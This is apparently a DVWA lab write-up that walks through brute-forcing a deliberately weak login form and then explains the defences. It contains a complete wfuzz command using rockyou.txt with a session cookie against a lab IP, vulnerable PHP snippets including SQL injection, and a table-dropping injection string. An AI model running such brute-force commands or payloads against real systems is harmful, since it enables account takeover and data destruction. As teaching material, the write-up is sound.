## 🔨 What is a Brute Force Attack?

> **Analogy:** Imagine a thief trying every key on a giant keyring until one opens your front door. A brute force attack is the digital version — trying thousands of passwords automatically until one works.

```
[Attacker] ──── password1 ───▶ [Login Form] ──▶ ❌ Wrong
[Attacker] ──── password2 ───▶ [Login Form] ──▶ ❌ Wrong
[Attacker] ──── password  ───▶ [Login Form] ──▶ ✅ Correct!
```

**Why it works on DVWA Low:** no attempt limits, no delays, no CAPTCHA, no alerts.

---

## 🔍 Vulnerability Analysis — Source Code

### Flaw 1 — Credentials in the URL (GET Request)
```php
$user = $_GET['username'];
$pass = $_GET['password'];
```
> **Analogy:** Shouting your PIN across a crowded room. The password appears in the browser bar, server logs, and browser history.

**Seen live in the lab:**
```
http://10.0.2.5/dvwa/vulnerabilities/brute/?username=admin&password=password
```

---

### Flaw 2 — No Rate Limiting or Lockout
> **Analogy:** A bank vault with no alarm — you can keep trying combinations forever with zero consequences.

There is literally nothing in the source code to stop repeated attempts.

---

### Flaw 3 — Broken Password Hashing (MD5)
```php
$pass = md5($pass);
```
> **Analogy:** MD5 is like a padlock whose master key is sold at every hardware store. It was never designed for passwords and is trivially cracked today.

| Algorithm | Status | Time to Crack |
|---|---|---|
| MD5 | ❌ Broken | Seconds |
| SHA1 | ❌ Broken | Minutes |
| bcrypt | ✅ Safe | Years |
| Argon2 | ✅ Best | Decades |

---

### Flaw 4 — SQL Injection (Bonus)
```php
$qry = "SELECT * FROM `users` WHERE user='$user' AND password='$pass';";
```
> **Analogy:** Asking someone their name and they reply `'; DROP TABLE users; --`. The app blindly trusts input and executes it. This is a separate lab exercise.

---

## 🛠️ Tools Used

### wfuzz
> **Analogy:** wfuzz is like a **robot postal worker** — you give it an address (URL), a giant bag of letters (wordlist), and it delivers each one automatically, reporting back which ones got a real response.

It replaces the `FUZZ` keyword in a URL with every word from a wordlist, firing thousands of requests and filtering responses by content or size.

### rockyou.txt
> **Analogy:** rockyou.txt is the **"most stolen keys" list** — 14+ million real passwords leaked from actual data breaches. If your password is on it, it is already compromised.

---

## ⚔️ Attack Execution

### Step 1 — Get the Session Cookie
```javascript
// Browser console (F12)
document.cookie
// "security=low; PHPSESSID=b5dc132ebc56268e5150188f5642a395"
```
> **Analogy:** The session cookie is your **visitor badge** — without it, wfuzz gets turned away before even reaching the login form.

---

### Step 2 — Run wfuzz
```bash
wfuzz -c -z file,/usr/share/wordlists/rockyou.txt \
  -b "security=low; PHPSESSID=b5dc132ebc56268e5150188f5642a395" \
  --hs "Username and/or password incorrect" \
  "http://10.0.2.5/dvwa/vulnerabilities/brute/?username=admin&password=FUZZ&Login=Login"
```

| Flag | What it does |
|---|---|
| `-z file,rockyou.txt` | The bag of keys to try |
| `-b "..."` | The visitor badge (session cookie) |
| `--hs "..."` | Discard all wrong-answer responses |
| `FUZZ` | Where each password gets inserted |

---

### Step 3 — Reading the Results
```
ID          Response  Chars    Payload
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
00000004:   200       4638 Ch  "password"  ← ✅ DIFFERENT
00004854:   200       4522 Ch  "#1bitch"   ← ❌ Wrong
00005369:   200       4522 Ch  "!@#$%^"    ← ❌ Wrong
```
> **Analogy:** Every wrong password returns an identical-sized error page. The correct password returns a **bigger page** because it includes the Welcome message. The odd one out is the answer.

---

## ✅ Result

```
Username : admin
Password : password
Found at : Attempt #4 of 14,344,399
```
> 🎯 Cracked at attempt **#4** — showing exactly why `password` as a password is catastrophic.

---

## 🛡️ Defense Strategies

> **Analogy:** Defending against brute force is like securing a building — you don't just change the lock, you add cameras, alarms, a guard, a visitor log, and a policy that bans people who try doors too many times.

### 1. Account Lockout
```
5 failed attempts → Account locked for 15 minutes
```
Effect: wfuzz gets blocked permanently after attempt #5.

### 2. Rate Limiting
```
Allow only 10 login attempts per minute per IP
14,344,399 ÷ 10 = ~3 YEARS to complete the attack
```

### 3. CAPTCHA
> **Analogy:** A bouncer who asks "Are you human?" — robots cannot answer, so they never get through.

### 4. Multi-Factor Authentication
> **Analogy:** A double-lock door — even if the attacker picks the first lock (password), the second lock (phone OTP) stops them completely.

### 5. POST Instead of GET
> **Analogy:** GET is writing your password on a postcard. POST is sealing it in an envelope.

### 6. Strong Password Hashing
```php
// ❌ BAD
$pass = md5($pass);

// ✅ GOOD
$pass = password_hash($pass, PASSWORD_BCRYPT, ['cost' => 12]);
```

### 7. Logging & Monitoring
> **Analogy:** Logs are your CCTV footage — even if you cannot stop the attack live, you can detect, trace, and respond to it.

What defenders see during our attack:
```log
10.0.2.15 "GET /brute/?username=admin&password=123456" 200
10.0.2.15 "GET /brute/?username=admin&password=password" 200
# 896,525 identical lines in under 60 seconds ← Obvious attack signature
```

---

## 🧠 Key Takeaways

| Lesson | Why It Matters |
|---|---|
| GET forms leak credentials | Passwords in URLs appear in logs, history, and proxies |
| MD5 is dead | Cracked in seconds — use bcrypt or Argon2 |
| No lockout = open season | 14 million passwords tested in under 2 minutes |
| `password` is not a password | Found at attempt #4 out of 14 million |
| Defense must be layered | No single fix is enough — stack them all |
| Attackers always leave traces | Every attempt is logged server-side |

---
